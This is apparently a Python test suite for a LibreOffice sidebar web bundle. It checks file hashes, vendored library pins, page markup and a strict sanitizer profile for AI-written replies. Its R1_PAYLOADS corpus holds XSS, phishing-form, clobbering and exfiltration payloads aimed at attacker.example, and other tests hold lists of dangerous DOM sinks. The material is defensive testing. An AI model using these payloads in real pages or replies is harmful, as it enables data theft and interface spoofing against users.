# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Atlas Omnia
"""The Sidecar window bundle (plugin/sidebar/): served-file list, origin pins, page rules.

These are static checks (standard library, no network, no browser). The browser proof of the
reply-rendering rules runs the R1_PAYLOADS corpus below in Chrome (the G3 smoke); the network
proof of the vendored files is scripts/verify_vendor.py in its own CI job.
"""
from __future__ import annotations

import contextlib
import hashlib
import importlib.util
import io
import json
import re
import shutil
import subprocess
import tarfile
import tempfile
import unittest
from html.parser import HTMLParser
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SIDEBAR = ROOT / "plugin" / "sidebar"

# docs/web-protocol.md 7.1 (with omnia-theme.js for omniaTheme.js: see the contract note in
# the lane report; the section 7 path rule allows lowercase names only).
SERVED = {
    "index.html", "app.js", "omnia-theme.js", "omnia-tokens.css", "omnia-pane.css", "taskpane.css",
    "sidecar-lo.css", "assets/icon.svg", "vendor/marked.umd.js", "vendor/purify.js",
}
NOT_SERVED = {"SHA256SUMS", "UPSTREAM.json", "vendor/VENDOR.json", "vendor/marked.LICENSE.md", "vendor/dompurify.LICENSE"}
OMNIA_CSS = ("omnia-tokens.css", "omnia-pane.css", "taskpane.css")
OWN_FILES = ("index.html", "app.js", "omnia-theme.js", "sidecar-lo.css", "assets/icon.svg")
CONTRACT_IDS = (
    "app-title", "settings-button", "connection-status", "privacy-badge", "desk-connect", "desk-connect-text",
    "desk-connect-code", "desk-connect-button", "bridge-status", "bridge-session-id", "new-chat-button", "messages",
    "prompt-input", "stop-button", "send-button", "settings-dialog", "close-settings-button", "save-settings-button",
    "bridge-url", "document-line",
)
API_ROUTES = {"/api/session", "/api/state", "/api/chat", "/api/turn", "/api/turn/stop", "/api/new-chat", "/api/session/close"}
ALLOWED_TAGS = ["p", "br", "strong", "em", "del", "code", "pre", "blockquote", "ul", "ol", "li", "h1", "h2", "h3", "h4",
                "h5", "h6", "table", "thead", "tbody", "tr", "th", "td", "hr", "a"]
ENDED_TEXTS = (
    "Click Open Sidecar in LibreOffice to reconnect.",
    "This document is open in a newer Sidecar window. This one is disconnected.",
    "LibreOffice closed this document.",
    "The LibreOffice plugin was turned off in Hermes.",
    "This window was idle too long. Click Open Sidecar in LibreOffice again.",
    "This launch was used by another program; that connection was closed. Click Open Sidecar again.",
    "Too many Sidecar windows are open, so this one was disconnected. Click Open Sidecar in LibreOffice again.",
)
STATUS_TEXTS = (
    "Hermes is working…", "Stopping…",
    "Hermes asked for an approval that Sidecar cannot give. Press Stop and ask in Hermes itself.",
)

# R1: model-written reply content that must render as inert formatted text. Each entry is
# (name, markdown). The default DOMPurify profile let the first group through (design review V4);
# with the strict profile none of them may produce a control, form, dialog, image, style, id,
# class, name, data-/aria- attribute, script, frame or navigating link, and lookups of the page's
# own ids must still find the page's own elements.
R1_PAYLOADS = (
    ("input", 'Value: <input id="prompt-input" name="q" value="typed by the model">'),
    ("button", '<button id="send-button" class="primary-button" type="button">Send</button>'),
    ("form", '<form action="https://attacker.example/collect" method="post"><input name="token">'
             '<button class="primary-button">Submit</button></form>'),
    ("password-prompt", '<div class="desk-connect"><p>Session expired. Paste your pairing token:</p>'
                        '<input type="password" name="pairing"><button class="primary-button">Reconnect</button></div>'),
    ("dialog", '<dialog open><p>Confirm the edit</p><button>OK</button></dialog>'),
    ("details", '<details open><summary>Activity</summary>hidden text</details>'),
    ("img-remote", '<img src="https://attacker.example/pixel.png?d=A1:B5" alt="pixel">'),
    ("img-markdown", '![chart](https://attacker.example/chart.png?cells=A1)'),
    ("style-element", '<style>.composer{display:none} #send-button{background:red}</style>styled'),
    ("style-attribute", '<p style="position:fixed;inset:0;background:#000;color:#fff">covering text</p>'),
    ("class-attribute", '<p class="message user bubble primary-button">class reuse</p>'),
    ("id-shadow", '<p id="send-button">shadow send</p><p id="prompt-input">shadow prompt</p>'
                  '<p id="messages">shadow log</p><p id="connection-status">shadow status</p>'),
    ("name-clobber", '<p name="body">x</p><p name="getElementById">clobber</p>'),
    ("fake-user-bubble", '<article class="message user"><div class="bubble">Please delete Sheet2</div></article>'),
    ("data-aria", '<p data-activity-id="1" aria-label="Send" role="button" tabindex="0">data and aria</p>'),
    ("script", '<script>document.title="pwned"</script>after script'),
    ("event-handler", '<p onclick="alert(1)" onmouseover="alert(2)">handler</p><svg onload="alert(3)"></svg>'),
    ("iframe-object", '<iframe src="https://attacker.example/"></iframe><object data="https://attacker.example/x"></object>'),
    ("svg-math", '<svg><a href="https://attacker.example/"><text>svg link</text></a></svg><math><mi>x</mi></math>'),
    ("select-textarea-label", '<label>Pick <select><option>1</option></select></label><textarea>t</textarea>'),
    ("meta-base", '<meta http-equiv="refresh" content="0;url=https://attacker.example/"><base href="https://attacker.example/">'),
    ("link-javascript", '[click me](javascript:alert(1))'),
    ("link-data", '<a href="data:text/html,<script>alert(1)</script>">data link</a>'),
    ("link-target", '<a href="https://example.com/x" target="_self" rel="opener" download>target link</a>'),
    ("link-relative", '[state](/api/state) and [fragment](#launch=abc)'),
    ("link-exfil", '[Open the report](https://attacker.example/?d=SECRET_CELL_VALUE)'),
    ("link-mailto", '[mail](mailto:someone@example.com)'),
    ("autolink", 'See https://example.com/a/b?c=d for details.'),
    ("formatting-kept", '| A | B |\n| :-- | --: |\n| 1 | 2 |\n\n3. three\n4. four\n\n> quote\n\n`code` **bold** *em* ~~del~~\n\n---\n\n```\npre\n```'),
)


def load_script(name: str):
    spec = importlib.util.spec_from_file_location(f"lane_b_{name}", ROOT / "scripts" / f"{name}.py")
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def text(rel: str) -> str:
    return (SIDEBAR / rel).read_text(encoding="utf-8")


class _Markup(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.elements: list[tuple[str, dict, bool]] = []   # (tag, attrs, inside <head>)
        self.script_bodies: list[str] = []
        self.styles = 0
        self._head = False
        self._script = None

    def handle_starttag(self, tag, attrs):
        if tag == "head":
            self._head = True
        self.elements.append((tag, dict(attrs), self._head))
        if tag == "script":
            self._script = []
        if tag == "style":
            self.styles += 1

    handle_startendtag = handle_starttag

    def handle_endtag(self, tag):
        if tag == "head":
            self._head = False
        if tag == "script" and self._script is not None:
            self.script_bodies.append("".join(self._script))
            self._script = None

    def handle_data(self, data):
        if self._script is not None:
            self._script.append(data)


def markup() -> _Markup:
    parser = _Markup()
    parser.feed(text("index.html"))
    return parser


class ServedFileListTests(unittest.TestCase):
    def setUp(self):
        self.sums = load_script("sidebar_sums")

    def test_sha256sums_matches_the_served_files(self):
        self.assertEqual(self.sums.check(SIDEBAR), [])

    def test_sha256sums_format(self):
        raw = (SIDEBAR / "SHA256SUMS").read_bytes()
        self.assertTrue(raw.endswith(b"\n"))
        self.assertNotIn(b"\r", raw)
        lines = raw.decode("ascii").splitlines()
        paths = [line.split("  ", 1)[1] for line in lines]
        self.assertEqual(paths, sorted(paths))
        for line in lines:
            self.assertRegex(line, r"^[0-9a-f]{64}  [a-z0-9][a-z0-9._-]*(/[a-z0-9][a-z0-9._-]*)*$")

    def test_bundle_holds_exactly_the_contract_files(self):
        served, not_served = self.sums.bundle_files(SIDEBAR)
        self.assertEqual(set(served), SERVED)
        self.assertEqual(set(not_served), NOT_SERVED)
        listed = {line.split("  ", 1)[1] for line in text("SHA256SUMS").splitlines()}
        self.assertEqual(listed, SERVED)

    def test_check_reports_tampered_unlisted_and_stray_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            copy = Path(tmp) / "sidebar"
            shutil.copytree(SIDEBAR, copy)
            self.assertEqual(self.sums.check(copy), [])
            (copy / "app.js").write_bytes((copy / "app.js").read_bytes() + b"\n")
            self.assertIn("app.js: hash differs", self.sums.check(copy))
            (copy / "extra.js").write_text("// new\n", encoding="utf-8")
            self.assertIn("extra.js: served file not listed", self.sums.check(copy))
            (copy / "extra.js").unlink()
            (copy / "logo.png").write_bytes(b"\x89PNG")
            self.assertTrue(any("logo.png" in p for p in self.sums.check(copy)))
            (copy / "logo.png").unlink()
            (copy / "Upper.js").write_text("//\n", encoding="utf-8")
            self.assertTrue(any("Upper.js" in p for p in self.sums.check(copy)))
            (copy / "Upper.js").unlink()
            with contextlib.redirect_stdout(io.StringIO()):
                self.assertEqual(self.sums.main(["--write"], sidebar=copy), 0)
            self.assertEqual(self.sums.check(copy), [])

    def test_files_are_text_and_not_minified_bundles(self):
        for path in SIDEBAR.rglob("*"):
            if path.is_file():
                rel = path.relative_to(SIDEBAR).as_posix()
                self.assertNotIn(".min.", rel)
                path.read_bytes().decode("utf-8")  # raises on binary content
        for rel in ("vendor/marked.umd.js", "vendor/purify.js"):
            self.assertGreater(text(rel).count("\n"), 2000, f"{rel} should be the unminified build")


class UpstreamPinTests(unittest.TestCase):
    def test_omnia_css_is_byte_identical_to_the_pinned_upstream_files(self):
        record = json.loads(text("UPSTREAM.json"))
        self.assertEqual(record["repository"], "AtlasOmnia/sidecar")
        self.assertRegex(record["commit"], r"^[0-9a-f]{40}$")
        self.assertEqual(sorted(entry["path"] for entry in record["files"]), sorted(OMNIA_CSS))
        verify = load_script("verify_vendor")
        for entry in record["files"]:
            data = (SIDEBAR / entry["path"]).read_bytes()
            self.assertEqual(entry["upstream_path"], "excel/src/taskpane/" + entry["path"])
            self.assertEqual(hashlib.sha256(data).hexdigest(), entry["sha256"], entry["path"])
            self.assertEqual(verify.git_blob_id(data), entry["git_blob"], entry["path"])

    def test_served_css_loads_nothing(self):
        for rel in (*OMNIA_CSS, "sidecar-lo.css"):
            css = text(rel)
            self.assertNotIn("url(", css, rel)
            self.assertNotIn("@import", css, rel)


class VendorRecordTests(unittest.TestCase):
    def setUp(self):
        self.record = json.loads(text("vendor/VENDOR.json"))
        self.verify = load_script("verify_vendor")

    def test_vendor_record_matches_the_shipped_files(self):
        versions = {package["name"]: package["version"] for package in self.record["packages"]}
        self.assertEqual(versions, {"marked": "15.0.12", "dompurify": "3.4.12"})
        recorded = set()
        for package in self.record["packages"]:
            name, version = package["name"], package["version"]
            self.assertEqual(package["tarball"], f"https://registry.npmjs.org/{name}/-/{name}-{version}.tgz")
            self.assertRegex(package["integrity"], r"^sha512-[A-Za-z0-9+/]{86}==$")
            for entry in package["files"]:
                self.assertTrue(entry["member"].startswith("package/"))
                self.assertEqual(sha256(SIDEBAR / entry["path"]), entry["sha256"], entry["path"])
                recorded.add(entry["path"])
        self.assertEqual(recorded, {p for p in SERVED | NOT_SERVED if p.startswith("vendor/") and p != "vendor/VENDOR.json"})

    def _tarball(self, members: dict[str, bytes]) -> bytes:
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for name, data in members.items():
                info = tarfile.TarInfo(name)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        return buffer.getvalue()

    def test_verify_vendor_checks_registry_integrity_and_members_offline(self):
        with tempfile.TemporaryDirectory() as tmp:
            sidebar = Path(tmp)
            (sidebar / "vendor").mkdir()
            (sidebar / "vendor" / "lib.js").write_bytes(b"lib\n")
            tgz = self._tarball({"package/lib.js": b"lib\n"})
            integrity = self.verify.sri_sha512(tgz)
            url = "https://registry.npmjs.org/lib/-/lib-1.0.0.tgz"
            package = {"name": "lib", "version": "1.0.0", "tarball": url, "integrity": integrity,
                       "files": [{"member": "package/lib.js", "path": "vendor/lib.js",
                                  "sha256": hashlib.sha256(b"lib\n").hexdigest()}]}

            def registry(meta_integrity=integrity, served=tgz):
                answers = {"https://registry.npmjs.org/lib/1.0.0":
                           json.dumps({"dist": {"tarball": url, "integrity": meta_integrity}}).encode(), url: served}
                return answers.__getitem__

            self.assertEqual(self.verify.check_package(package, sidebar, registry()), [])
            self.assertTrue(self.verify.check_package(package, sidebar, registry(meta_integrity="sha512-x")))
            self.assertTrue(self.verify.check_package(package, sidebar, registry(served=self._tarball({"package/lib.js": b"evil\n"}))))
            (sidebar / "vendor" / "lib.js").write_bytes(b"changed\n")
            self.assertEqual(self.verify.check_package(package, sidebar, registry()),
                             ["lib@1.0.0: shipped vendor/lib.js differs from the recorded SHA-256"])

    def test_verify_upstream_requires_byte_identity_offline(self):
        with tempfile.TemporaryDirectory() as tmp:
            sidebar = Path(tmp)
            (sidebar / "a.css").write_bytes(b"a{}\n")
            commit = "0" * 40
            record = {"repository": "o/r", "commit": commit, "files": [
                {"path": "a.css", "upstream_path": "x/a.css", "sha256": hashlib.sha256(b"a{}\n").hexdigest(),
                 "git_blob": self.verify.git_blob_id(b"a{}\n")}]}
            url = f"https://raw.githubusercontent.com/o/r/{commit}/x/a.css"
            self.assertEqual(self.verify.check_upstream(record, sidebar, {url: b"a{}\n"}.__getitem__), [])
            self.assertEqual(len(self.verify.check_upstream(record, sidebar, {url: b"a{ }\n"}.__getitem__)), 2)
        self.assertEqual(self.verify.git_blob_id(b""), "e69de29bb2d1d6434b8b29ae775ad8c2e48c5391")


class PageMarkupTests(unittest.TestCase):
    def setUp(self):
        self.page = markup()

    def test_app_js_is_the_first_classic_script_in_head(self):
        scripts = [attrs for tag, attrs, in_head in self.page.elements if tag == "script"]
        self.assertTrue(all(in_head for tag, _a, in_head in self.page.elements if tag == "script"))
        self.assertEqual(scripts[0], {"src": "app.js"})
        self.assertEqual(scripts[1], {"src": "omnia-theme.js"})
        self.assertEqual([s["src"] for s in scripts[2:]], ["vendor/marked.umd.js", "vendor/purify.js"])
        self.assertTrue(all("defer" in s for s in scripts[2:]))

    def test_no_inline_script_style_or_event_handler(self):
        self.assertEqual(self.page.styles, 0)
        self.assertTrue(all(body.strip() == "" for body in self.page.script_bodies))
        for tag, attrs, _ in self.page.elements:
            self.assertNotIn("style", attrs, tag)
            self.assertFalse([a for a in attrs if a.startswith("on")], tag)
            for name in ("src", "href", "action"):
                value = attrs.get(name)
                if value is not None:
                    self.assertNotRegex(value, r"^[a-z]+:|^//", f"{tag} {name}={value}")

    def test_contract_ids_exist_once_with_their_roles(self):
        ids = [attrs["id"] for _t, attrs, _ in self.page.elements if "id" in attrs]
        for element_id in CONTRACT_IDS:
            self.assertEqual(ids.count(element_id), 1, element_id)
        by_id = {attrs["id"]: (tag, attrs) for tag, attrs, _ in self.page.elements if "id" in attrs}
        self.assertEqual(by_id["messages"][1].get("role"), "log")
        self.assertEqual(by_id["connection-status"][1].get("role"), "status")
        self.assertEqual([a for _t, a, _ in self.page.elements if a.get("role") == "status"], [by_id["connection-status"][1]])
        radios = [(a["name"], a["value"]) for t, a, _ in self.page.elements if t == "input" and a.get("type") == "radio"]
        self.assertEqual(radios, [("omnia-palette", v) for v in ("teal", "blue", "gold", "red")] +
                         [("omnia-mode", v) for v in ("auto", "dark", "light")])

    def test_controls_have_names_and_the_dialog_is_labelled(self):
        source = text("index.html")
        for match in re.finditer(r"<button\b([^>]*)>(.*?)</button>", source, re.S):
            attrs, inner = match.group(1), re.sub(r"<[^>]+>", "", match.group(2)).strip()
            self.assertTrue(inner or "aria-label=" in attrs, match.group(0)[:80])
        prompt = next(a for t, a, _ in self.page.elements if a.get("id") == "prompt-input")
        self.assertTrue(prompt.get("aria-label"))
        self.assertEqual(prompt.get("aria-describedby"), "composer-keys")
        dialog = next(a for t, a, _ in self.page.elements if t == "dialog")
        self.assertEqual(dialog.get("aria-labelledby"), "settings-title")
        form = next(a for t, a, _ in self.page.elements if t == "form")
        self.assertEqual(form.get("method"), "dialog")

    def test_only_icon_is_the_svg_mark(self):
        images = [a for t, a, _ in self.page.elements if t == "img"]
        self.assertEqual([a["src"] for a in images], ["assets/icon.svg"])
        icons = [a for t, a, _ in self.page.elements if t == "link" and a.get("rel") == "icon"]
        self.assertEqual([a["href"] for a in icons], ["assets/icon.svg"])
        self.assertNotIn("<script", text("assets/icon.svg"))

    def test_markup_uses_the_excel_pane_structure(self):
        classes = set()
        for _t, attrs, _ in self.page.elements:
            classes.update((attrs.get("class") or "").split())
        for name in ("app-shell", "topbar", "header-main", "brand-mark", "header-status", "privacy-badge",
                     "desk-connect", "bridge-strip", "bridge-copy", "bridge-status", "bridge-session-id",
                     "bridge-copy-button", "messages", "composer", "composer-box", "composer-actions",
                     "primary-button", "secondary-button", "icon-button", "settings-dialog", "settings-panel",
                     "settings-content", "theme-group", "palette-options", "appearance-options", "theme-choice",
                     "palette-swatch", "theme-note"):
            self.assertIn(name, classes)
        stylesheets = [a["href"] for t, a, _ in self.page.elements if t == "link" and a.get("rel") == "stylesheet"]
        self.assertEqual(stylesheets, ["omnia-tokens.css", "omnia-pane.css", "taskpane.css", "sidecar-lo.css"])


class PageScriptTests(unittest.TestCase):
    def setUp(self):
        self.app = text("app.js")
        self.theme = text("omnia-theme.js")
        # Comments may name forbidden things; the rules apply to code.
        self.code = re.sub(r"^\s*//.*$", "", self.app, flags=re.M)

    def test_launch_code_is_taken_and_the_url_cleaned_before_anything_else(self):
        take = self.code.index("/^#launch=([A-Za-z0-9_-]{43})$/")
        clean = self.code.index('history.replaceState(null, "", "/ui/index.html")')
        ready = self.code.index('addEventListener("DOMContentLoaded"')
        self.assertLess(take, clean)
        self.assertLess(clean, ready)
        self.assertNotIn("location.search", self.code)
        self.assertEqual(self.code.count("location.hash"), 1)

    def test_page_calls_only_the_contract_routes(self):
        literals = set(re.findall(r'"(/[a-z][a-z0-9/._-]*)["?]', self.code))
        self.assertEqual({l for l in literals if l.startswith("/api/")}, API_ROUTES)
        self.assertEqual(literals - API_ROUTES, {"/ui/index.html"})
        self.assertNotRegex(self.code, r"https?://")

    def test_session_token_is_kept_in_memory_only(self):
        for forbidden in ("localStorage", "sessionStorage", "document.cookie", "window.name", "indexedDB", "caches."):
            self.assertNotIn(forbidden, self.code)
        self.assertIn('var THEME_KEY = "omnia.theme";', self.theme)
        self.assertNotIn("sessionStorage", self.theme)
        self.assertNotIn("location", self.theme)

    def test_every_fetch_omits_credentials(self):
        self.assertEqual(self.code.count("fetch("), 2)
        self.assertEqual(self.code.count('credentials: "omit"'), 2)
        self.assertIn("keepalive: true", self.code)

    def _group(self, pattern: str, source: str) -> str:
        match = re.search(pattern, source, re.S)
        self.assertIsNotNone(match, pattern)
        assert match is not None
        return match.group(1)

    def test_strict_reply_profile(self):
        block = self.code[self.code.index("var REPLY_POLICY"):]
        block = block[:block.index("});") + 3]
        tags = self._group(r"ALLOWED_TAGS: Object\.freeze\(\[(.*?)\]\)", block)
        self.assertEqual(re.findall(r'"([a-z0-9]+)"', tags), ALLOWED_TAGS)
        attrs = self._group(r"ALLOWED_ATTR: Object\.freeze\(\[(.*?)\]\)", block)
        self.assertEqual(re.findall(r'"([a-z]+)"', attrs), ["href", "align", "start"])
        uri_safe = self._group(r"ADD_URI_SAFE_ATTR: Object\.freeze\(\[(.*?)\]\)", block)
        self.assertEqual(re.findall(r'"([a-z]+)"', uri_safe), ["align", "start"])
        for setting in ("ALLOW_DATA_ATTR: false", "ALLOW_ARIA_ATTR: false", "ALLOWED_URI_REGEXP: /^(https?|mailto):/i",
                        "RETURN_TRUSTED_TYPE: true"):
            self.assertIn(setting, block)
        self.assertIn("window.marked.parse(markdown, { async: false, breaks: true })", self.code)
        self.assertEqual(self.code.count(".sanitize("), 1)

    def test_model_written_html_is_shown_as_text(self):
        rules = self.code[self.code.index("function installMarkdownRules"):]
        rules = rules[:rules.index("\n  }\n")]
        self.assertIn("window.marked.use({", rules)
        self.assertIn("html: function (token)", rules)
        self.assertIn("escapeHtml(", rules)
        self.assertIn("var LINE_BREAK_TAG = /^<br\\s*\\/?>$/i;", self.code)
        escape = self.code[self.code.index("function escapeHtml"):]
        for entity in ("&amp;", "&lt;", "&gt;", "&quot;", "&#39;"):
            self.assertIn(entity, escape[:400])

    def test_one_html_sink_and_no_code_from_strings(self):
        self.assertEqual(re.findall(r"[\w.]*\.innerHTML\s*=[^;]*;", self.code),
                         ["target.innerHTML = purify.sanitize(html, REPLY_POLICY);"])
        for sink in ("outerHTML", "insertAdjacentHTML", "document.write", "DOMParser", "createContextualFragment",
                     "srcdoc", "eval(", "new Function", "importScripts", "setAttribute(\"on", "createElement(\"script\""):
            self.assertNotIn(sink, self.code)
        self.assertNotRegex(self.code, r"setTimeout\(\s*[\"'`]")
        self.assertNotIn("innerHTML", self.theme)

    def test_nothing_in_the_page_navigates_or_opens_a_window(self):
        for nav in ("window.open", "location.href", "location.assign", "location.replace", "location.reload",
                    'createElement("a")', "target =", ".href =", "showOpenFilePicker"):
            self.assertNotIn(nav, self.code)
        self.assertIn('anchor.replaceWith(button)', self.code)

    def test_window_alignment_resizes_before_it_moves(self):
        self.assertEqual(self.code.count("window.resizeTo("), 1)
        self.assertEqual(self.code.count("window.moveTo("), 1)
        self.assertLess(self.code.index("window.resizeTo("), self.code.index("window.moveTo("))
        self.assertIn('data.mode === "app" && validBounds(data.bounds)', self.code)
        self.assertIn("window.outerHeight - window.innerHeight", self.code)

    def test_page_texts_are_the_contract_texts(self):
        for sentence in ENDED_TEXTS + STATUS_TEXTS:
            self.assertIn(sentence, self.app)
        for reason in ("replaced", "host_gone", "turned_off", "idle", "double_use", "evicted"):
            self.assertRegex(self.app, rf"\b{reason}: \"")

    def test_long_poll_is_reissued_from_the_network_callback(self):
        self.assertIn('"/api/turn?id=" + encodeURIComponent(t.id) + "&seq=" + t.seq + "&have=" + t.have', self.code)
        self.assertNotRegex(self.code, r"setInterval\(\s*pollTurn")
        self.assertIn("setTimeout(pollTurn, RETRY_MS)", self.code)
        self.assertIn("var RETRY_MS = 1000;", self.code)
        self.assertIn("var STATE_POLL_MS = 3000;", self.code)


class PageRuntimeTests(unittest.TestCase):
    """Execute the shipped closure with deterministic timers/transport (no npm dependencies)."""

    def run_js(self, setup, checks):
        if not shutil.which("node"):
            self.skipTest("Node is needed for the deterministic page runtime regressions")
        source = text("app.js").rsplit("})();", 1)[0] + setup + "\n})();"
        harness = r'''
const vm = require("vm"), assert = require("assert");
const elements = new Map(), requests = [], timers = new Map();
let timerId = 0;
function el(id) {
  if (!elements.has(id)) elements.set(id, {textContent:"", hidden:true, disabled:false,
    value:"", checked:false, className:"", title:"", addEventListener(){},
    setAttribute(){}, focus(){}, closest(){return {contains(){return false;}};}});
  return elements.get(id);
}
global.window = {location:{hash:"", origin:"http://localhost"},
  screen:{availLeft:0,availTop:0,availWidth:1920,availHeight:1080},
  screenX:100,screenY:100,outerWidth:400,outerHeight:600,innerHeight:568,
  resizeTo(w,h){this.outerWidth=w;this.outerHeight=h;},
  moveTo(x,y){this.screenX=x;this.screenY=y;}, addEventListener(){}};
global.document = {hidden:false, visibilityState:"visible", activeElement:null,
  getElementById:el, addEventListener(){}, body:{}};
global.history = {replaceState(){}};
global.setTimeout = fn => {const id=++timerId;timers.set(id,fn);return id;};
global.clearTimeout = id => timers.delete(id);
global.setInterval = global.setTimeout; global.clearInterval = global.clearTimeout;
global.fetch = (path, init) => new Promise((resolve,reject)=>requests.push({path,init,resolve,reject}));
const flush = async () => {for(let i=0;i<12;i++) await Promise.resolve();};
(async()=>{
vm.runInThisContext(SOURCE);
CHECKS
})().catch(e=>{console.error(e);process.exitCode=1;});
'''.replace("SOURCE", json.dumps(source)).replace("CHECKS", checks)
        result = subprocess.run(["node", "-e", harness], text=True, capture_output=True, timeout=20)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)

    def test_p03_late_state_failure_after_successful_retry_is_ignored(self):
        for failure in ('requests[0].reject(new Error("late"));',
                        'requests[0].resolve({ok:false,status:503,json:async()=>({})});'):
            with self.subTest(failure=failure):
                self.run_js('''
  session = "test";
  pendingSend = {id:"send", message:"hello", tries:3, unknown:true};
  // The actual poll/retry/delivery logic; suppress unrelated turn rendering only.
  startTurn = function () { turn = {id:"reply"}; };
  window.retry = retryPending;
  pollState();
''', '''
window.retry();
assert.equal(requests.length,2);
requests[1].resolve({ok:true,status:202,json:async()=>({turn:{id:"reply"}})});
await flush();
''' + failure + '''
await flush();
assert.equal(el("desk-connect").hidden,true);
assert.notEqual(el("connection-status").textContent,"Hermes not reachable");
''')


class ReplyCorpusTests(unittest.TestCase):
    def test_corpus_covers_the_design_review_payloads(self):
        names = {name for name, _ in R1_PAYLOADS}
        for required in ("input", "button", "form", "dialog", "details", "img-remote", "style-element",
                         "style-attribute", "class-attribute", "id-shadow", "name-clobber", "fake-user-bubble",
                         "link-exfil", "link-javascript"):
            self.assertIn(required, names)
        self.assertEqual(len(names), len(R1_PAYLOADS))


class HeaderAndPrivacyTests(unittest.TestCase):
    def test_own_files_carry_spdx_and_copyright(self):
        for rel in OWN_FILES:
            head = text(rel)[:600]
            self.assertIn("SPDX-License-Identifier: Apache-2.0", head, rel)
            self.assertIn("Copyright 2026 Atlas Omnia", head, rel)

    def test_bundle_names_no_private_host_or_path(self):
        pattern = re.compile(r"\bATLAS\b|/Users/[A-Za-z]|/Volumes/|C:\\Users\\|\b8642\b|\b8660\b")
        for path in SIDEBAR.rglob("*"):
            if path.is_file() and not path.relative_to(SIDEBAR).as_posix().startswith("vendor/"):
                for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
                    self.assertIsNone(pattern.search(line), f"{path.relative_to(ROOT)}:{number}")


if __name__ == "__main__":
    unittest.main()
